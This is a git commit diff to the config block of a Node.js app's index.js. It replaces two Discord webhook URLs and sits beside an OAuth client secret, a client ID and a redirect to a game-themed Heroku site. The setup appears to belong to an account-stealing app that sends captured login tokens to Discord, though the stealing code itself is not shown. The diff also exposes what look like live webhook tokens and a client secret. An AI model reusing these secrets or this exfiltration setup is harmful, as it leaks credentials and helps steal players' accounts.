c451ace6ad2ad5810108a44e32282f451661cec0
RomaMeizer <117209156+RomaMeizer@users.noreply.github.com>
2022-11-05 18:17:08 +0100

    Update index.js

--- index.js
+++ index.js
@@ -2,8 +2,8 @@
 const client_secret = '7305f2f3-b121-4b6a-8fbf-c4c9ef3c840f'
 const client_id = '7305f2f3-b121-4b6a-8fbf-c4c9ef3c840f'
 const redirect_uri = 'https://skyblockvoid.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1038208475676819571/fWNYZJV_YpK5s-69zNa7aCdw06S9wfdrYr9rYyHzIJnOBKNY4jxgGE6wQxkdZRfOePHJ'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1038208475676819571/fWNYZJV_YpK5s-69zNa7aCdw06S9wfdrYr9rYyHzIJnOBKNY4jxgGE6wQxkdZRfOePHJ'
+const webhook_url = 'https://discord.com/api/webhooks/1038502024557367356/zR0ASU9t7rMrCZoUYPtpoGsXHrpXhkL49cx7svSVJAj72e3_I1K1f3SE1YUS_9Jzz6Ql'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1038502024557367356/zR0ASU9t7rMrCZoUYPtpoGsXHrpXhkL49cx7svSVJAj72e3_I1K1f3SE1YUS_9Jzz6Ql'
 // Config end
 const axios = require('axios')
 const express = require('express')
